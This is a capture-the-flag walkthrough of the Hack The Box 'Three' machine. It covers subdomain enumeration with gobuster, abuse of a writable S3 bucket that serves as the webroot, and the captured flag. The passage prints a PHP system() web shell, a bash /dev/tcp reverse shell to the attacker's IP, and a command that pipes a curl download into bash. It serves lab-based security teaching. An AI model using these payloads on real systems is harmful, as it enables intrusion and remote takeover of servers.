We scan as usual. Also, we try and put the target ip in the url bar, and sure enough, we get a website for booking a band tickets.

Using Wappalyzer, we learn that php is used in making this website.

If we scrolled down, we see the email: mail@thetoppers.htb. thetoppers.htb is the domain, so we can put this along the target ip address in our /etc/hosts so we can access this domain in our browser.

echo "(target ip) thetoppers.htb" | sudo tee -a /etc/hosts


What is a subdomain?:

A subdomain name is a piece of additional information added to the beginning of a website’s domain name.
It allows websites to separate and organize content for a specific function — such as a blog or an online
store — from the rest of your website.
For example, if we visit hackthebox.com we can access the main website. Or, we can visit
ctf.hackthebox.com to access the section of the website that is used for CTFs. In this case, ctf is the
subdomain, hackthebox is the primary domain and com is the top-level domain (TLD).

Often, different subdomains will have different IP addresses, so when our system goes to look up the
subdomain, it gets the address of the server that handles that application. It is also possible to have one
server handle multiple subdomains. This is accomplished via "host-based routing", or "virtual host routing",
where the server uses the Host header in the HTTP request to determine which application is meant to
handle the request.

We will try to enumerate for different subdomains using gobuster.

gobuster vhost --append-domain -w /home/kali/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u   http://thetoppers.htb/

vhost : Uses VHOST for brute-forcing
-w : Path to the wordlist
-u : Specify the URL
--append-domain:the enumeration takes into account the known vHost ( thetoppers.htb ) and appends it
to the words found in the wordlist ( word.thetoppers.htb ). (for Gobuster version 3.2.0 and above)

The gobuster result shows that there exists a sub-domain called s3.thetoppers.htb . Let's also add an
entry for this sub-domain in the /etc/hosts file.

echo "10.129.227.248 s3.thetoppers.htb" | sudo tee -a /etc/hosts.

Then we visit s3.thetoppers.htb/

We get a json file only contains : {"status": "running"}


What is an S3 bucket?

 S3 is a cloud-based object storage service. It allows us to store things in containers called buckets. AWS
S3 buckets have various use-cases including Backup and Storage, Media Hosting, Software Delivery, Static
Website etc. The files stored in the Amazon S3 bucket are called S3 objects.

We can interact with this S3 bucket with the aid of the awscli utility.

First, we need to configure the aws using aws configure. We will put a random value for all the fields that we are going to be asked. Let the value be temp.

We can list all of the S3 buckets hosted by the server by using the ls command: aws --endpoint=http://s3.thetoppers.htb s3 ls

We can also use the ls command to list objects and common prefixes under the specified bucket:aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb

We see the files index.php , .htaccess and a directory called images in the specified bucket. It seems like
this is the webroot of the website running on port 80 . So the Apache server is using this S3 bucket as
storage.
awscli has got another feature that allows us to copy files to a remote bucket. We already know that the
website is using PHP. Thus, we can try uploading a PHP shell file to the S3 bucket and since it's uploaded to
the webroot directory we can visit this webpage in the browser, which will, in turn, execute this file and we
will achieve remote code execution.
We can use the following PHP one-liner which uses the system() function which takes the URL parameter
cmd as an input and executes it as a system command: <?php system($_GET["cmd"]); ?>

We create a php file that has this code: 

echo "<?php system($_GET["cmd"]); ?>">shell.php

Then, we can upload this PHP shell to the thetoppers.htb S3 bucket using the following command: aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb.

We can confirm that our shell is uploaded by navigating to http://thetoppers.htb/shell.php. Let us try
executing the OS command id using the URL parameter cmd : http://thetoppers.htb/shell.php?cmd=id

The response from the server contains the output of the OS command id , which verified that we have code
execution on the box. Thus, let us now try to obtain a reverse shell.
Through a reverse shell, we will trigger the remote host to connect back to our local machine's IP address on
the specified listening port. We can obtain the tun0 IP address of our local machine using the following
command: ifconfig tun0

Let's get a reverse shell by creating a new file shell.sh containing the following bash reverse shell payload
which will connect back to our local machine on port 1337 :

#!/bin/bash
bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1

We will start a ncat listener on our local port 1337 using the following command:nc -nvlp 1337

-n disables DNS resolution, so IP addresses will be displayed instead of hostnames.
-v enables verbose output, providing more information during the connection.
-l instructs nc to listen for incoming connections.
-p 1337 specifies the port number to listen on (in this case, port 1337).

Let's start a web server on our local machine on port 8000 and host this bash file. It is crucial to note here
that this command for hosting the web server must be run from the directory which contains the reverse
shell file. So, we must first traverse to the appropriate directory and then run the following command: python3 -m http.server 8000

We can use the curl utility to fetch the bash reverse shell file from our local host and then pipe it to bash
in order to execute it. Thus, let us visit the following URL containing the payload in the browser.

(target ip)/shell.php?cmd=curl%20(YOUR_IP_ADDRESS):8000/shell.sh|bash

That's what we get: www-data@three:/var/www/html$ 


 The flag can be found at /var/www/flag.txt :
 cat /var/www/flag.txt

 flag:a980d99281a28d638ac68b9bf9453c2b

 //END





